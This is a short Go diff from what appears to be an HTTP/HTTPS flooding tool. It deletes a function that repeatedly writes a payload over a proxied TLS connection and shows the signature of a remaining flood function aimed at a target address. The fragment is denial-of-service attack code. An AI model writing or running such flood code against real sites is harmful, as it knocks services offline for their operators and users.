@@ -22,14 +22,6 @@ var (
 	}
 )
 
-func https_flood_unprotected(proxyConn net.Conn, payload []byte, repeatRequest int, TLSConfig *tls.Config) {
-	tlsConn := tls.Client(proxyConn, TLSConfig)
-	for i := 0; i < repeatRequest; i++ {
-		tlsConn.Write(payload)
-	}
-	tlsConn.Close()
-}
-
 func Http_flood_unprotected(proxyAddr, targetAddr string, payload []byte, https bool, repeatRequest int, noProxiedRate float64) {
 
 	for {
